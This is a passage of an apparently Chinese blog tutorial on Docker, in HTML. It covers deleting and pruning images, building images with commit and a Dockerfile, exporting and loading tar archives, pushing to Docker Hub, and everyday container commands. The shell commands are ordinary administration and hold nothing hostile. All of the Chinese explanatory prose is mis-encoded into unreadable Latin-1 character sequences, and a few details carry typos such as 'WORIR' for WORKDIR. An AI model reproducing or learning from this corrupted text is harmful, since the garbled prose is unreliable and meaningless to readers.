æ­¤æˆ‘ä»¬éœ€è¦äº¤äº’å¼ç»ˆç«¯ã€‚</li><li>â€“rmï¼šè¿™ä¸ªå‚æ•°æ˜¯è¯´å®¹å™¨é€€å‡ºåéšä¹‹å°†å…¶åˆ é™¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ºäº†æ’éšœéœ€æ±‚ï¼Œé€€å‡ºçš„å®¹å™¨å¹¶ä¸ä¼šç«‹å³åˆ é™¤ï¼Œé™¤éæ‰‹åŠ¨ docker rmã€‚æˆ‘ä»¬è¿™é‡Œåªæ˜¯éšä¾¿æ‰§è¡Œä¸ªå‘½ä»¤ï¼Œçœ‹çœ‹ç»“æœï¼Œä¸éœ€è¦æ’éšœå’Œä¿ç•™ç»“æœï¼Œå› æ­¤ä½¿ç”¨ â€“rm å¯ä»¥é¿å…æµªè´¹ç©ºé—´ã€‚</li><li>ubuntu:18.04ï¼šè¿™æ˜¯æŒ‡ç”¨ ubuntu:18.04 é•œåƒä¸ºåŸºç¡€æ¥å¯åŠ¨å®¹å™¨ã€‚</li><li>bashï¼šæ”¾åœ¨é•œåƒååçš„æ˜¯ å‘½ä»¤ï¼Œè¿™é‡Œæˆ‘ä»¬å¸Œæœ›æœ‰ä¸ªäº¤äº’å¼ Shellï¼Œå› æ­¤ç”¨çš„æ˜¯ bashã€‚</li></ul><p>è¿›å…¥å®¹å™¨åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Shell ä¸‹æ“ä½œï¼Œæ‰§è¡Œä»»ä½•æ‰€éœ€çš„å‘½ä»¤ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬æ‰§è¡Œäº† cat /etc/os-releaseï¼Œè¿™æ˜¯ Linux å¸¸ç”¨çš„æŸ¥çœ‹å½“å‰ç³»ç»Ÿç‰ˆæœ¬çš„å‘½ä»¤ï¼Œä»è¿”å›çš„ç»“æœå¯ä»¥çœ‹åˆ°å®¹å™¨å†…æ˜¯ Ubuntu 18.04.1 LTS ç³»ç»Ÿã€‚</p><p>æœ€åæˆ‘ä»¬é€šè¿‡ exit é€€å‡ºäº†è¿™ä¸ªå®¹å™¨ã€‚</p><h3 id="Docker-åˆ é™¤é•œåƒ"><a href="#Docker-åˆ é™¤é•œåƒ" class="headerlink" title="Docker åˆ é™¤é•œåƒ"></a>Docker åˆ é™¤é•œåƒ</h3><p><strong>é€šè¿‡æ ‡ç­¾åˆ é™¤é•œåƒ</strong></p><p>é€šè¿‡å¦‚ä¸‹ä¸¤ä¸ªéƒ½å¯ä»¥åˆ é™¤é•œåƒï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi <span class="string">[image]</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">image</span> rm [<span class="built_in">image</span>]</span><br></pre></td></tr></table></figure><p>æ”¯æŒçš„å­å‘½ä»¤å¦‚ä¸‹ï¼š</p><ul><li><code>-f,-force</code>: å¼ºåˆ¶åˆ é™¤é•œåƒï¼Œå³ä¾¿æœ‰å®¹å™¨å¼•ç”¨è¯¥é•œåƒï¼›</li><li><code>-no-prune</code>: ä¸è¦åˆ é™¤æœªå¸¦æ ‡ç­¾çš„çˆ¶é•œåƒï¼›</li></ul><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬æƒ³åˆ é™¤ä¸Šç« èŠ‚åˆ›å»ºçš„ <code>qymua_mysql:5.7</code> é•œåƒï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi qymua_mysql:5.7</span><br></pre></td></tr></table></figure><p><strong>å®é™…ä¸Šï¼Œå½“åŒä¸€ä¸ªé•œåƒæ‹¥æœ‰å¤šä¸ªæ ‡ç­¾æ—¶ï¼Œæ‰§è¡Œ <code>docker rmi</code> å‘½ä»¤ï¼Œåªæ˜¯ä¼šåˆ é™¤äº†è¯¥é•œåƒä¼—å¤šæ ‡ç­¾ä¸­ï¼Œæ‚¨æŒ‡å®šçš„æ ‡ç­¾è€Œå·²ï¼Œå¹¶ä¸ä¼šå½±å“åŸå§‹çš„é‚£ä¸ªé•œåƒæ–‡ä»¶ã€‚</strong></p><p>é‚£ä¹ˆï¼Œå¦‚æœæŸä¸ªé•œåƒä¸å­˜åœ¨å¤šä¸ªæ ‡ç­¾ï¼Œå½“ä¸”ä»…å½“åªæœ‰ä¸€ä¸ªæ ‡ç­¾æ—¶ï¼Œæ‰§è¡Œåˆ é™¤å‘½ä»¤æ—¶ï¼Œæ‚¨å°±è¦å°å¿ƒäº†ï¼Œè¿™ä¼šå½»åº•åˆ é™¤é•œåƒã€‚</p><p><strong>é€šè¿‡ ID åˆ é™¤é•œåƒ</strong></p><p>é™¤äº†é€šè¿‡æ ‡ç­¾åç§°æ¥åˆ é™¤é•œåƒï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åˆ¶å®šé•œåƒ ID, æ¥åˆ é™¤é•œåƒï¼Œå¦‚ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi ee7cbd482336</span><br></pre></td></tr></table></figure><p>ä¸€æ—¦åˆ¶å®šäº†é€šè¿‡ ID æ¥åˆ é™¤é•œåƒï¼Œå®ƒä¼šå…ˆå°è¯•åˆ é™¤æ‰€æœ‰æŒ‡å‘è¯¥é•œåƒçš„æ ‡ç­¾ï¼Œç„¶ååœ¨åˆ é™¤é•œåƒæœ¬èº«ã€‚</p><p><strong>åˆ é™¤é•œåƒçš„é™åˆ¶</strong></p><p>åˆ é™¤é•œåƒå¾ˆç®€å•ï¼Œä½†ä¹Ÿä¸æ˜¯æˆ‘ä»¬ä½•æ—¶ä½•åœ°éƒ½èƒ½åˆ é™¤çš„ï¼Œå®ƒå­˜åœ¨ä¸€äº›é™åˆ¶æ¡ä»¶ã€‚</p><p>å½“é€šè¿‡è¯¥é•œåƒåˆ›å»ºçš„å®¹å™¨æœªè¢«é”€æ¯æ—¶ï¼Œé•œåƒæ˜¯æ— æ³•è¢«åˆ é™¤çš„ã€‚</p><p>é™¤éé€šè¿‡æ·»åŠ  <code>-f</code> å­å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯å¼ºåˆ¶åˆ é™¤ï¼Œæ‰èƒ½ç§»é™¤æ‰è¯¥é•œåƒ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">rmi</span> <span class="selector-tag">-f</span> <span class="selector-tag">mysql</span><span class="selector-pseudo">:5.7</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œä¸€èˆ¬ä¸æ¨èè¿™æ ·æš´åŠ›çš„åšæ³•ï¼Œæ­£ç¡®çš„åšæ³•åº”è¯¥æ˜¯ï¼š</p><ol><li>å…ˆåˆ é™¤å¼•ç”¨è¿™ä¸ªé•œåƒçš„å®¹å™¨ï¼›</li><li>å†åˆ é™¤è¿™ä¸ªé•œåƒï¼›</li></ol><p>ä¹Ÿå°±æ˜¯ï¼Œæ ¹æ®å¼•ç”¨è¯¥é•œåƒçš„å®¹å™¨ ID ( <code>9d59e2278553</code>), æ‰§è¡Œåˆ é™¤å‘½ä»¤ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm <span class="number">9d</span><span class="number">59e2278553</span></span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œå†æ‰§è¡Œåˆ é™¤é•œåƒçš„å‘½ä»¤ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi <span class="number">5</span>cb3aa00f899</span><br></pre></td></tr></table></figure><p><strong>æ¸…ç†é•œåƒ</strong></p><p>æˆ‘ä»¬åœ¨ä½¿ç”¨ Docker ä¸€æ®µæ—¶é—´åï¼Œç³»ç»Ÿä¸€èˆ¬éƒ½ä¼šæ®‹å­˜ä¸€äº›ä¸´æ—¶çš„ã€æ²¡æœ‰è¢«ä½¿ç”¨çš„é•œåƒæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ¸…ç†ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">image</span> prune</span><br></pre></td></tr></table></figure><p>å®ƒæ”¯æŒçš„å­å‘½ä»¤æœ‰ï¼š</p><ul><li><code>-a,--all</code>: åˆ é™¤æ‰€æœ‰æ²¡æœ‰ç”¨çš„é•œåƒï¼Œè€Œä¸ä»…ä»…æ˜¯ä¸´æ—¶æ–‡ä»¶ï¼›</li><li><code>-f,--force</code>ï¼šå¼ºåˆ¶åˆ é™¤é•œåƒæ–‡ä»¶ï¼Œæ— éœ€å¼¹å‡ºæç¤ºç¡®è®¤ï¼›</li></ul><h3 id="Docker-åˆ›å»ºé•œåƒ"><a href="#Docker-åˆ›å»ºé•œåƒ" class="headerlink" title="Docker åˆ›å»ºé•œåƒ"></a>Docker åˆ›å»ºé•œåƒ</h3><p>Docker åˆ›å»ºé•œåƒä¸»è¦æœ‰ä¸‰ç§ï¼š</p><ol><li>åŸºäºå·²æœ‰çš„é•œåƒåˆ›å»ºï¼›</li><li>åŸºäº Dockerfile æ¥åˆ›å»ºï¼›</li><li>åŸºäºæœ¬åœ°æ¨¡æ¿æ¥å¯¼å…¥ï¼›</li></ol><p>æˆ‘ä»¬å°†ä¸»è¦ä»‹ç»å¸¸ç”¨çš„ 1ï¼Œ2 ä¸¤ç§ã€‚</p><p><strong>åŸºäºå·²æœ‰çš„é•œåƒåˆ›å»º</strong></p><p>é€šè¿‡å¦‚ä¸‹å‘½ä»¤æ¥åˆ›å»ºï¼š</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">container</span> commit</span><br></pre></td></tr></table></figure><p>æ”¯æŒçš„å­å‘½ä»¤å¦‚ä¸‹ï¼š</p><ul><li><code>-a,--author</code>=â€â€: ä½œè€…ä¿¡æ¯ï¼›</li><li><code>-c,--change</code>=[]: å¯ä»¥åœ¨æäº¤çš„æ—¶å€™æ‰§è¡Œ Dockerfile æŒ‡ä»¤ï¼Œå¦‚ CMDã€ENTRYPOINTã€ENVã€EXPOSEã€LABELã€ONBUILDã€USERã€VOLUMEã€WORIR ç­‰ï¼›</li><li><code>-m,--message</code>=â€â€: æäº¤ä¿¡æ¯ï¼›</li><li><code>-p,--pause</code>=true: æäº¤æ—¶ï¼Œæš‚åœå®¹å™¨è¿è¡Œã€‚</li></ul><p>æ¥ä¸‹æ¥ï¼ŒåŸºäºæœ¬åœ°å·²æœ‰çš„ Ubuntu é•œåƒï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566222657046.png" alt></p><p>é¦–å…ˆï¼Œè®©æˆ‘å°†å®ƒè¿è¡Œèµ·æ¥ï¼Œå¹¶åœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ª test.txt æ–‡ä»¶ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566222903594.png" alt></p><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@ubuntuweb</span><span class="symbol">:/</span><span class="comment"># docker run -it ubuntu:latest /bin/bash</span></span><br><span class="line">root<span class="variable">@437b2645a468</span><span class="symbol">:/</span><span class="comment"># touch test.txt</span></span><br><span class="line">root<span class="variable">@437b2645a468</span><span class="symbol">:/</span><span class="comment"># exit</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®Œ test.txt æ–‡ä»¶åï¼Œéœ€è¦è®°ä½æ ‡æ³¨çš„å®¹å™¨ ID: <code>a0a0c8cfec3a</code>, ç”¨å®ƒæ¥æäº¤ä¸€ä¸ªæ–°çš„é•œåƒ(<strong>PS: ä½ ä¹Ÿå¯ä»¥é€šè¿‡åç§°æ¥æäº¤é•œåƒï¼Œè¿™é‡Œåªæ¼”ç¤ºé€šè¿‡ ID çš„æ–¹å¼</strong>)ã€‚</p><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container <span class="keyword">commit</span> -m <span class="string">"Added test.txt file"</span> -a <span class="string">"QYMUA"</span> <span class="number">437</span>b2645a468 <span class="keyword">test</span>:<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>æäº¤æˆåŠŸåï¼Œä¼šè¿”å›æ–°åˆ›å»ºçš„é•œåƒ ID ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566223141324.png" alt></p><p>å†æ¬¡æŸ¥çœ‹æœ¬åœ°é•œåƒä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°æ–°åˆ›å»ºçš„ <code>test:0.1</code> é•œåƒäº†ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566223162903.png" alt></p><p><strong>åŸºäº Dockerfile åˆ›å»º</strong></p><p>é€šè¿‡ Dockerfile çš„æ–¹å¼æ¥åˆ›å»ºé•œåƒï¼Œæ˜¯æœ€å¸¸è§çš„ä¸€ç§æ–¹å¼äº†ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒæ¨èçš„æ–¹å¼ã€‚Dockerfile æ˜¯ä¸€ä¸ªæ–‡æœ¬æŒ‡ä»¤æ–‡ä»¶ï¼Œå®ƒæè¿°äº†æ˜¯å¦‚ä½•åŸºäºä¸€ä¸ªçˆ¶é•œåƒï¼Œæ¥åˆ›å»ºä¸€ä¸ªæ–°é•œåƒçš„è¿‡ç¨‹ã€‚</p><p>ä¸‹é¢è®©æˆ‘ä»¬æ¥ç¼–å†™ä¸€ä¸ªç®€å•çš„ Dockerfile æ–‡ä»¶ï¼Œå®ƒæè¿°äº†åŸºäº Ubuntu çˆ¶é•œåƒï¼Œå®‰è£… Python3 ç¯å¢ƒçš„é•œåƒï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:latest</span><br><span class="line">LABEL <span class="attribute">version</span>=<span class="string">"1.0"</span> <span class="attribute">maintainer</span>=<span class="string">"QYMUA &lt;Qymua@github&gt;"</span></span><br><span class="line"><span class="builtin-name">RUN</span> apt-<span class="builtin-name">get</span> update &amp;&amp; \    apt-<span class="builtin-name">get</span> install -y python3 &amp;&amp; \    apt-<span class="builtin-name">get</span> clean &amp;&amp; \    rm -rf /var/lib/apt/lists/*</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå®Œæˆåï¼Œé€šè¿‡è¿™ä¸ª Dockerfile æ–‡ä»¶ï¼Œæ¥æ„å»ºæ–°çš„é•œåƒï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">image</span> build -t <span class="keyword">python</span>:<span class="number">3</span> .</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š</strong> å‘½ä»¤çš„æœ€åæœ‰ä¸ªç‚¹ï¼Œå¦‚æœä¸åŠ çš„è¯ï¼Œä¼šæ„å»ºä¸æˆåŠŸ </p><h3 id="Docker-å¯¼å‡º-amp-åŠ è½½é•œåƒ"><a href="#Docker-å¯¼å‡º-amp-åŠ è½½é•œåƒ" class="headerlink" title="Docker å¯¼å‡º&amp;åŠ è½½é•œåƒ"></a>Docker å¯¼å‡º&amp;åŠ è½½é•œåƒ</h3><p>é€šå¸¸æˆ‘ä»¬ä¼šæœ‰ä¸‹é¢è¿™ç§éœ€æ±‚ï¼Œéœ€è¦å°†é•œåƒåˆ†äº«ç»™åˆ«äººï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å°†é•œåƒå¯¼å‡ºæˆ tar åŒ…ï¼Œåˆ«äººç›´æ¥é€šè¿‡åŠ è½½è¿™ä¸ª tar åŒ…ï¼Œå¿«é€Ÿåœ°å°†é•œåƒå¼•å…¥åˆ°æœ¬åœ°é•œåƒåº“ã€‚</p><p>è¦æƒ³ä½¿ç”¨è¿™ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸»è¦æ˜¯é€šè¿‡å¦‚ä¸‹ä¸¤ä¸ªå‘½ä»¤ï¼š</p><ol><li><code>docker save</code></li><li><code>docker load</code></li></ol><p><strong>å¯¼å‡ºé•œåƒ</strong></p><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬æƒ³è¦å°† test:0.1 é•œåƒå¯¼å‡ºæ¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">save</span> <span class="selector-tag">-o</span> <span class="selector-tag">test_0</span><span class="selector-class">.1</span><span class="selector-class">.tar</span> <span class="selector-tag">test</span><span class="selector-pseudo">:0.1</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸåï¼ŒæŸ¥çœ‹å½“å‰ç›®å½•ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566223683239.png" alt></p><p>å¯ä»¥çœ‹åˆ° <code>test_0.1.tar</code> é•œåƒæ–‡ä»¶å·²ç»ç”Ÿæˆ</p><p><strong>åŠ è½½é•œåƒ</strong></p><p>åˆ«äººæ‹¿åˆ°äº†è¿™ä¸ª <code>tar</code> åŒ…åï¼Œè¦å¦‚ä½•å¯¼å…¥åˆ°æœ¬åœ°çš„é•œåƒåº“å‘¢ï¼Ÿ</p><p>é€šè¿‡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">load</span> <span class="selector-tag">-i</span> <span class="selector-tag">test_0</span><span class="selector-class">.1</span><span class="selector-class">.tar</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">load</span> &lt; <span class="selector-tag">test_0</span><span class="selector-class">.1</span><span class="selector-class">.tar</span></span><br></pre></td></tr></table></figure><p>å¯¼å…¥æˆåŠŸåï¼ŒæŸ¥çœ‹æœ¬åœ°é•œåƒä¿¡æ¯ï¼Œä½ å°±å¯ä»¥è·å¾—åˆ«äººåˆ†äº«çš„é•œåƒäº†ï¼æ€ä¹ˆæ ·ï¼Œæ˜¯ä¸æ˜¯å¾ˆæ–¹ä¾¿å‘¢ï¼</p><h3 id="Docker-ä¸Šä¼ é•œåƒ"><a href="#Docker-ä¸Šä¼ é•œåƒ" class="headerlink" title="Docker ä¸Šä¼ é•œåƒ"></a>Docker ä¸Šä¼ é•œåƒ</h3><p>ä»¥ä¸Šä¼ åˆ° Docker Hub ä¸Šä¸ºç¤ºä¾‹ï¼Œæ¼”ç¤º Docker å¦‚ä½•ä¸Šä¼ é•œåƒã€‚</p><p><strong>è·å– Docker ID</strong></p><p>æƒ³è¦ä¸Šä¼ é•œåƒåˆ° Docker Hub ä¸Šï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ³¨å†Œ Docker Hub è´¦å·ã€‚æ‰“å¼€ Docker Hub ç½‘å€ <a href="https://hub.docker.comï¼Œå¼€å§‹æ³¨å†Œï¼š" target="_blank" rel="noopener">https://hub.docker.comï¼Œå¼€å§‹æ³¨å†Œï¼š</a></p><p>ä½¿ç”¨æ–¹æ³•å’Œgithubå¤§è‡´ç›¸åŒï¼Œåˆ›å»ºä»“åº“å³å¯</p><p><strong>ä¸Šä¼ é•œåƒ</strong></p><p>è¿›å…¥å‘½ä»¤è¡Œï¼Œ<strong>ç”¨æˆ‘ä»¬åˆšåˆšè·å–çš„ Docker ID ä»¥åŠå¯†ç ç™»å½•</strong>ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker login</span></span><br></pre></td></tr></table></figure><p>å‘½ä»¤è¡Œç™»å½• Docker ID</p><p>ç™»å½•æˆåŠŸåï¼Œæˆ‘ä»¬å¼€å§‹å‡†å¤‡ä¸Šä¼ æœ¬åœ°çš„ é•œåƒï¼š</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯¹å…¶æ‰“ä¸€ä¸ªæ–°çš„æ ‡ç­¾ï¼Œ<strong>å‰ç¼€ä¸æˆ‘ä»¬æ–°åˆ›å»ºçš„ Docker ID ã€ä»“åº“åä¿æŒä¸€è‡´</strong>:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">tag</span> <span class="title">test</span>:<span class="number">0.1</span> dockerID/test:<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æœ¬åœ°ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ ‡ç­¾æ‰“æˆåŠŸäº†ã€‚æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">push</span> dockerID/<span class="keyword">test</span>:<span class="number">0.1</span></span><br></pre></td></tr></table></figure><h2 id="æ“ä½œDocker"><a href="#æ“ä½œDocker" class="headerlink" title="æ“ä½œDocker"></a>æ“ä½œDocker</h2><h3 id="Dockerå¸¸ç”¨å‘½ä»¤"><a href="#Dockerå¸¸ç”¨å‘½ä»¤" class="headerlink" title="Dockerå¸¸ç”¨å‘½ä»¤"></a>Dockerå¸¸ç”¨å‘½ä»¤</h3><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566369005697.png" alt></p><p><strong>Search images</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo docker search ubuntu</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬éœ€è¦æ‹‰å–ä¸€ä¸ª docker é•œåƒï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> pull image_name</span><br></pre></td></tr></table></figure><p><code>image_name</code> ä¸ºé•œåƒçš„åç§°ï¼Œè€Œå¦‚æœæˆ‘ä»¬æƒ³ä» Docker Hub ä¸Šå»ä¸‹è½½æŸä¸ªé•œåƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker</span> <span class="selector-tag">pull</span> <span class="selector-tag">centos</span><span class="selector-pseudo">:latest</span></span><br></pre></td></tr></table></figure><p><code>centos:lastest</code> æ˜¯é•œåƒçš„åç§°ï¼Œ Docker daemon å‘ç°æœ¬åœ°æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„é•œåƒï¼Œä¼šè‡ªåŠ¨å» Docker Hub ä¸Šå»ä¸‹è½½é•œåƒï¼Œä¸‹è½½å®Œæˆåï¼Œè¯¥é•œåƒè¢«é»˜è®¤ä¿å­˜åˆ° <code>/var/lib/docker</code> ç›®å½•ä¸‹ã€‚</p><p>æ¥ç€æˆ‘ä»¬å¦‚æœæƒ³æŸ¥çœ‹ä¸‹ä¸»æœºä¸‹å­˜åœ¨å¤šå°‘é•œåƒï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦æƒ³çŸ¥é“å½“å‰æœ‰å“ªäº›å®¹å™¨åœ¨è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><code>-a</code> æ˜¯æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬æœªè¿è¡Œçš„</p><p>æˆ‘ä»¬è¯¥å¦‚ä½•å»å¯¹ä¸€ä¸ªå®¹å™¨è¿›è¡Œå¯åŠ¨ï¼Œé‡å¯å’Œåœæ­¢å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> container_name/container_id</span><br><span class="line">docker restart container_name/container_id</span><br><span class="line">docker <span class="literal">stop</span> container_name/container_id</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¦‚æœæƒ³è¿›å…¥åˆ°è¿™ä¸ªå®¹å™¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ attach å‘½ä»¤ï¼š</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">attach</span> container_name/container_id</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨dockerfileæ„å»ºé•œåƒï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="keyword">build </span>-t qymua/nginx_web:<span class="number">0</span>.<span class="number">1</span> .</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹ï¼Œ -t æ˜¯ä¸ºæ–°é•œåƒè®¾ç½®ä»“åº“å’Œåç§°ï¼Œå…¶ä¸­ qymua ä¸ºä»“åº“åï¼Œ nginx_web ä¸ºé•œåƒåï¼Œ :0.1 ä¸ºæ ‡ç­¾ï¼ˆä¸æ·»åŠ ä¸ºé»˜è®¤ latest ï¼‰</p><p>é‚£å¦‚æœæˆ‘ä»¬æƒ³è¿è¡Œè¿™ä¸ªå®¹å™¨ä¸­çš„é•œåƒçš„è¯ï¼Œå¹¶ä¸”è°ƒç”¨é•œåƒé‡Œé¢çš„ bash ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -<span class="selector-tag">i</span> container_name/container_id /bin/bash</span><br></pre></td></tr></table></figure><ul><li>docker run - è¿è¡Œä¸€ä¸ªå®¹å™¨</li><li>-t - åˆ†é…ä¸€ä¸ªï¼ˆä¼ªï¼‰tty (link is external)</li><li>-i - äº¤äº’æ¨¡å¼ (so we can interact with it)</li><li>ubuntu:14.04 - ä½¿ç”¨ ubuntu åŸºç¡€é•œåƒ 14.04</li><li>/bin/bash - è¿è¡Œå‘½ä»¤ bash shell</li></ul><p>é‚£å¦‚æœè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æƒ³åˆ é™¤æŒ‡å®šé•œåƒçš„è¯ï¼Œç”±äº image è¢«æŸä¸ª container å¼•ç”¨ï¼ˆæ‹¿æ¥è¿è¡Œï¼‰ï¼Œå¦‚æœä¸å°†è¿™ä¸ªå¼•ç”¨çš„ container é”€æ¯ï¼ˆåˆ é™¤ï¼‰ï¼Œé‚£ image è‚¯å®šæ˜¯ä¸èƒ½è¢«åˆ é™¤ã€‚æˆ‘ä»¬é¦–å…ˆå¾—å…ˆå»åœæ­¢è¿™ä¸ªå®¹å™¨ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">ps</span></span><br><span class="line">docker <span class="keyword">stop</span> container_name/container_id</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ç”¨å¦‚ä¸‹å‘½ä»¤å»åˆ é™¤è¿™ä¸ªå®¹å™¨ï¼š</p><figure class="highlight stata"><table><tr><td 